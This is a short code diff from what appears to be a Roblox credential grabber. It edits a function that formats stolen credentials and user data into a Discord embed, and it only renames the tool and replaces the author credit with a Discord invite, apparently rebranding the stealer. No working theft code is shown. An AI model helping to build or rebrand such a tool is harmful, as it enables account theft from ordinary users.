@@ -470,7 +470,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
 
   // First embed: Credentials + Comprehensive User Data
   const credentialsAndDataEmbed = {
-    title: "<:emoji_37:1410520517349212200> EXTENSION-GRABBER",
+    title: "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
     color: 0x8B5CF6,
     fields: [
       {
@@ -540,7 +540,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
       }
     ],
     footer: {
-      text: "Made By sl4a"
+      text: "Made By .gg/sZbFX2wPVz"
     },
     timestamp: new Date(logData.timestamp).toISOString()
   };
